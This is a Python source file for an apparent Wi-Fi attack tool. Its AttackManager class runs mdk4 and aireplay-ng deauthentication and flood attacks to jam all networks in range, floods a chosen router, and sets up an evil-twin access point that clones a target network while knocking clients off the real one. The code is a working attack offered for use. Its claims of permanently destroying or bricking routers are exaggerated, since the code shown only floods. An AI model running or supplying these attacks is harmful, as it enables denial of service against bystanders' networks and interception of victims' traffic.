#!/usr/bin/env python3

import os
import time
import threading
import subprocess
from typing import List

class AttackManager:
    def __init__(self, core, scanner):
        self.core = core
        self.scanner = scanner
        self.attack_processes = []
        self.attack_running = False
        self.attack_threads = []
        self.evil_twin_running = False
        self.captured_password = None

    def ultra_mass_destruction(self):
        """ULTRA POWERFUL MASS DESTRUCTION - Complete WiFi annihilation"""
        print("\033[1;31m[💀] INITIATING ULTRA MASS DESTRUCTION PROTOCOL...\033[0m")
        print("\033[1;33m[⚠️] WARNING: This will completely jam ALL WiFi networks in range!\033[0m")
        print("\033[1;33m[⚠️] No device will be able to connect until attack stops!\033[0m")
        
        confirm = input("\033[1;31m[?] CONFIRM TOTAL WIFI ANNIHILATION? (y/N): \033[0m")
        
        if confirm.lower() not in ['y', 'yes']:
            print("\033[1;33m[!] MASS DESTRUCTION CANCELLED\033[0m")
            return
        
        self.core.set_current_operation("ULTRA_MASS_DESTRUCTION")
        self.attack_running = True
        
        print("\033[1;31m[💣] DEPLOYING NUCLEAR WEAPONS...\033[0m")
        
        # Weapon 1: MDK4 Complete Destruction
        print("\033[1;31m[⚡] WEAPON 1: MDK4 TOTAL ANNIHILATION\033[0m")
        proc1 = self.core.run_command(
            f"mdk4 {self.core.mon_interface} d -c 1,2,3,4,5,6,7,8,9,10,11,12,13,14",
            background=True
        )
        if proc1:
            self.attack_processes.append(proc1)
            self.core.add_attack_process(proc1)
        
        # Weapon 2: Beacon Flood Chaos
        print("\033[1;31m[⚡] WEAPON 2: BEACON FLOOD CHAOS\033[0m")
        proc2 = self.core.run_command(
            f"mdk4 {self.core.mon_interface} b -s 1000",
            background=True
        )
        if proc2:
            self.attack_processes.append(proc2)
            self.core.add_attack_process(proc2)
        
        # Weapon 3: Authentication DoS
        print("\033[1;31m[⚡] WEAPON 3: AUTHENTICATION DoS\033[0m")
        proc3 = self.core.run_command(
            f"mdk4 {self.core.mon_interface} a -m",
            background=True
        )
        if proc3:
            self.attack_processes.append(proc3)
            self.core.add_attack_process(proc3)
        
        # Weapon 4: Probe Request Flood
        print("\033[1;31m[⚡] WEAPON 4: PROBE REQUEST FLOOD\033[0m")
        proc4 = self.core.run_command(
            f"mdk4 {self.core.mon_interface} p -t",
            background=True
        )
        if proc4:
            self.attack_processes.append(proc4)
            self.core.add_attack_process(proc4)
        
        # Weapon 5: Continuous Deauth All
        print("\033[1;31m[⚡] WEAPON 5: CONTINUOUS DEAUTH ALL\033[0m")
        deauth_thread = threading.Thread(target=self.continuous_deauth_all)
        deauth_thread.daemon = True
        deauth_thread.start()
        
        print(f"\033[1;32m[✓] {len(self.attack_processes)+1} NUCLEAR WEAPONS DEPLOYED\033[0m")
        print("\033[1;31m[💥] ALL WIFI NETWORKS ARE BEING ANNIHILATED!\033[0m")
        print("\033[1;33m[!] NO DEVICE CAN CONNECT TO ANY WIFI UNTIL ATTACK STOPS!\033[0m")
        
        # Start ultra destruction animation
        anim_thread = threading.Thread(target=self.show_ultra_destruction_animation)
        anim_thread.daemon = True
        anim_thread.start()
        
        print("\033[1;33m[!] PRESS ENTER TO STOP TOTAL ANNIHILATION...\033[0m")
        input()
        
        self.stop_attacks()
        self.core.clear_current_operation()
        print("\033[1;32m[✓] ULTRA MASS DESTRUCTION TERMINATED\033[0m")

    def continuous_deauth_all(self):
        """Continuous deauth attack on all networks"""
        while self.attack_running:
            # Broadcast deauth to all devices
            self.core.run_command(f"aireplay-ng --deauth 1000 -D {self.core.mon_interface}")
            time.sleep(1)

    def router_destroyer(self):
        """ROUTER DESTROYER - Permanent damage to routers"""
        print("\033[1;31m[💀] INITIATING ROUTER DESTROYER PROTOCOL...\033[0m")
        print("\033[1;31m[⚠️] ⚠️  EXTREME WARNING: THIS CAN PERMANENTLY DAMAGE ROUTERS! ⚠️\033[0m")
        print("\033[1;31m[⚠️] ROUTERS MAY BECOME COMPLETELY UNUSABLE AFTER THIS ATTACK!\033[0m")
        print("\033[1;31m[⚠️] USE ONLY ON ROUTERS YOU OWN OR HAVE EXPLICIT PERMISSION!\033[0m")
        
        confirm1 = input("\033[1;31m[?] TYPE 'DESTROY' TO ACKNOWLEDGE PERMANENT DAMAGE: \033[0m")
        if confirm1.lower() != 'destroy':
            print("\033[1;33m[!] ROUTER DESTROYER CANCELLED\033[0m")
            return
            
        confirm2 = input("\033[1;31m[?] TYPE 'CONFIRM' TO PROCEED WITH ROUTER DESTRUCTION: \033[0m")
        if confirm2.lower() != 'confirm':
            print("\033[1;33m[!] ROUTER DESTROYER CANCELLED\033[0m")
            return
        
        if self.scanner.wifi_scan():
            self.scanner.display_scan_results()
            target = self.scanner.select_target()
            
            if target:
                print(f"\033[1;31m[💀] TARGETING ROUTER FOR DESTRUCTION: {target['essid']}\033[0m")
                self.start_router_destruction(target)

    def start_router_destruction(self, target):
        """Start permanent router destruction"""
        self.core.set_current_operation("ROUTER_DESTROYER")
        self.attack_running = True
        
        print("\033[1;31m[💣] DEPLOYING ROUTER DESTRUCTION WEAPONS...\033[0m")
        
        # Set target channel
        self.core.run_command(f"iwconfig {self.core.mon_interface} channel {target['channel']}")
        
        # Weapon 1: Permanent Deauth Flood
        print("\033[1;31m[⚡] WEAPON 1: PERMANENT DEAUTH FLOOD\033[0m")
        proc1 = self.core.run_command(
            f"while true; do aireplay-ng --deauth 0 -a {target['bssid']} {self.core.mon_interface}; done",
            background=True
        )
        if proc1:
            self.attack_processes.append(proc1)
            self.core.add_attack_process(proc1)
        
        # Weapon 2: MDK4 Router Crash
        print("\033[1;31m[⚡] WEAPON 2: MDK4 ROUTER CRASH\033[0m")
        proc2 = self.core.run_command(
            f"mdk4 {self.core.mon_interface} d -c {target['channel']} -B {target['bssid']}",
            background=True
        )
        if proc2:
            self.attack_processes.append(proc2)
            self.core.add_attack_process(proc2)
        
        # Weapon 3: Authentication Storm
        print("\033[1;31m[⚡] WEAPON 3: AUTHENTICATION STORM\033[0m")
        proc3 = self.core.run_command(
            f"mdk4 {self.core.mon_interface} a -a {target['bssid']} -m",
            background=True
        )
        if proc3:
            self.attack_processes.append(proc3)
            self.core.add_attack_process(proc3)
        
        # Weapon 4: Association Flood
        print("\033[1;31m[⚡] WEAPON 4: ASSOCIATION FLOOD\033[0m")
        proc4 = self.core.run_command(
            f"mdk4 {self.core.mon_interface} a -s 1000",
            background=True
        )
        if proc4:
            self.attack_processes.append(proc4)
            self.core.add_attack_process(proc4)
        
        print(f"\033[1;32m[✓] {len(self.attack_processes)} DESTRUCTION WEAPONS DEPLOYED\033[0m")
        print(f"\033[1;31m[💥] ROUTER {target['essid']} IS BEING PERMANENTLY DESTROYED!\033[0m")
        print("\033[1;31m[⚠️] ROUTER MAY BECOME UNRESPONSIVE AND REQUIRE HARD RESET!\033[0m")
        
        # Start destruction animation
        anim_thread = threading.Thread(target=self.show_router_destruction_animation)
        anim_thread.daemon = True
        anim_thread.start()
        
        print("\033[1;33m[!] PRESS ENTER TO STOP ROUTER DESTRUCTION...\033[0m")
        input()
        
        self.stop_attacks()
        self.core.clear_current_operation()
        print("\033[1;32m[✓] ROUTER DESTRUCTION TERMINATED\033[0m")
        print("\033[1;33m[!] Router may require physical reset to function again!\033[0m")

    def advanced_evil_twin(self):
        """Advanced Evil Twin with perfect replication and password capture"""
        print("\033[1;33m[!] INITIATING ADVANCED EVIL TWIN ATTACK...\033[0m")
        
        if self.scanner.wifi_scan():
            self.scanner.display_scan_results()
            target = self.scanner.select_target()
            
            if target:
                print(f"\033[1;31m[👥] CREATING PERFECT EVIL TWIN FOR: {target['essid']}\033[0m")
                self.start_advanced_evil_twin(target)

    def start_advanced_evil_twin(self, target):
        """Start advanced evil twin attack"""
        try:
            self.core.set_current_operation("EVIL_TWIN")
            self.evil_twin_running = True
            
            print("\033[1;36m[→] PREPARING PERFECT EVIL TWIN...\033[0m")
            
            # Stop NetworkManager to avoid conflicts
            self.core.run_command("systemctl stop NetworkManager >/dev/null 2>&1")
            time.sleep(2)
            
            # Set interface to target channel
            self.core.run_command(f"iwconfig {self.core.mon_interface} channel {target['channel']}")
            
            # Create hostapd configuration with EXACT same name
            hostapd_conf = f"""
interface={self.core.mon_interface}
driver=nl80211
ssid={target['essid']}
channel={target['channel']}
hw_mode=g
auth_algs=1
wpa=2
wpa_passphrase=freewifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
ignore_broadcast_ssid=0
"""
            
            with open("/tmp/evil_twin.conf", "w") as f:
                f.write(hostapd_conf)
            
            # Create dnsmasq configuration
            dnsmasq_conf = f"""
interface={self.core.mon_interface}
dhcp-range=192.168.1.100,192.168.1.200,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,8.8.8.8
log-queries
log-dhcp
"""
            
            with open("/tmp/dnsmasq.conf", "w") as f:
                f.write(dnsmasq_conf)
            
            # Configure interface
            self.core.run_command(f"ifconfig {self.core.mon_interface} 192.168.1.1 netmask 255.255.255.0 up")
            
            # Start dnsmasq
            print("\033[1;36m[→] STARTING DNSMASQ...\033[0m")
            dnsmasq_proc = self.core.run_command("dnsmasq -C /tmp/dnsmasq.conf", background=True)
            if dnsmasq_proc:
                self.attack_processes.append(dnsmasq_proc)
                self.core.add_attack_process(dnsmasq_proc)
            
            # Start hostapd
            print("\033[1;36m[→] STARTING EVIL TWIN ACCESS POINT...\033[0m")
            hostapd_proc = self.core.run_command("hostapd /tmp/evil_twin.conf", background=True)
            if hostapd_proc:
                self.attack_processes.append(hostapd_proc)
                self.core.add_attack_process(hostapd_proc)
            
            time.sleep(5)
            
            # Start deauth attack to force victims to connect to our AP
            print("\033[1;36m[→] DEPLOYING DEAUTH ATTACK ON REAL NETWORK...\033[0m")
            deauth_proc = self.core.run_command(
                f"aireplay-ng --deauth 0 -a {target['bssid']} {self.core.mon_interface}",
                background=True
            )
            if deauth_proc:
                self.attack_processes.append(deauth_proc)
                self.core.add_attack_process(deauth_proc)
            
            print("\033[1;32m[✓] EVIL TWIN DEPLOYED SUCCESSFULLY!\033[0m")
            print(f"\033[1;32m[📡] NETWORK: {target['essid']} (EXACT COPY)\033[0m")
            print("\033[1;32m[🔓] PASSWORD: freewifi123\033[0m")
            print("\033[1;33m[!] WAITING FOR VICTIMS TO CONNECT...\033[0m")
            print("\033[1;33m[!] PRESS ENTER TO STOP EVIL TWIN...\033[0m")
            
            # Monitor for connections
            monitor_thread = threading.Thread(target=self.monitor_evil_twin)
            monitor_thread.daemon = True
            monitor_thread.start()
            
            input()
            
            # Cleanup
            self.stop_evil_twin()
            self.core.clear_current_operation()
            print("\033[1;32m[✓] EVIL TWIN ATTACK STOPPED\033[0m")
            
        except Exception as e:
            print(f"\033[1;31m[✘] EVIL TWIN FAILED: {e}\033[0m")
            self.stop_evil_twin()
            self.core.run_command("systemctl start NetworkManager >/dev/null 2>&1")

    def monitor_evil_twin(self):
        """Monitor evil twin for connections and password attempts"""
        while self.evil_twin_running:
            # Check dnsmasq logs for connections
            result = self.core.run_command("tail -n 10 /var/log/syslog 2>/dev/null | grep dnsmasq | grep DHCPACK")
            if result and result.stdout:
                print(f"\033[1;32m[🔗] DEVICE CONNECTED: {result.stdout}\033[0m")
            
            time.sleep(2)

    def stop_evil_twin(self):
        """Stop evil twin attack"""
        self.evil_twin_running = False
        self.stop_attacks()
        self.core.run_command("pkill hostapd")
        self.core.run_command("pkill dnsmasq")
        self.core.run_command("systemctl start NetworkManager >/dev/null 2>&1")

    def show_ultra_destruction_animation(self):
        """Show ultra destruction animation"""
        frames = ["💀", "☠️", "💣", "🔥", "☢️", "⚡", "💥", "🌋"]
        messages = [
            "ANNIHILATING ALL WIFI SIGNALS",
            "JAMMING ALL FREQUENCIES",
            "BLOCKING ALL CONNECTIONS", 
            "TOTAL WIFI BLACKOUT",
            "COMPLETE SIGNAL JAMMING",
            "NO NETWORK CAN SURVIVE"
        ]
        frame_idx = 0
        msg_idx = 0
        
        while self.attack_running:
            frame = frames[frame_idx]
            message = messages[msg_idx]
            frame_idx = (frame_idx + 1) % len(frames)
            msg_idx = (msg_idx + 1) % len(messages)
            print(f"\033[1;31m[{frame}] {message} - NO WIFI CAN CONNECT!\033[0m", end='\r')
            time.sleep(0.3)

    def show_router_destruction_animation(self):
        """Show router destruction animation"""
        frames = ["💀", "☠️", "💣", "🔥", "💥", "⚡"]
        messages = [
            "DESTROYING ROUTER HARDWARE",
            "OVERLOADING ROUTER CPU",
            "CORRUPTING ROUTER FIRMWARE",
            "PERMANENT DAMAGE IN PROGRESS",
            "ROUTER MAY BECOME BRICKED"
        ]
        frame_idx = 0
        msg_idx = 0
        
        while self.attack_running:
            frame = frames[frame_idx]
            message = messages[msg_idx]
            frame_idx = (frame_idx + 1) % len(frames)
            msg_idx = (msg_idx + 1) % len(messages)
            print(f"\033[1;31m[{frame}] {message} - ROUTER DESTRUCTION ACTIVE!\033[0m", end='\r')
            time.sleep(0.4)

    def stop_attacks(self):
        """Stop all running attacks"""
        self.attack_running = False
        self.evil_twin_running = False
        self.core.stop_all_attacks()
        self.attack_processes = []
